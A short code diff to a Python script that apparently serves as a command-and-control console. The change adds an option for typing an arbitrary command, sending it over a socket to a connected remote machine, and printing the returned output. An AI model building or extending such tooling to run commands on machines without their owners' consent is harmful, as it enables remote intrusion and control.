@@ -154,6 +154,18 @@ def commandHQ():
                 ans = True
             except:
                 reload()
+                
+        if command == "7":
+            try:
+                command = input(format + "Enter command: ")
+                
+                message = str(['ecmdc', command])
+                message = message.encode()
+                
+                conn.send(message)
+                ans = True
+            except:
+                reload()
 
         if(ans == False): commandHQ()
 
@@ -178,7 +190,10 @@ def commandHQ():
             if incoming_message[0] == "ol": # 5
                 print(format + "Data received: {}".format(incoming_message[1]))
                 
-            if incoming_message[0] == "eh": #6
+            if incoming_message[0] == "eh": # 6
+                print(format + "Data received: {}".format(incoming_message[1]))
+                
+            if incoming_message[0] == "ecmdc": # 7
                 print(format + "Data received: {}".format(incoming_message[1]))
 
 clear()
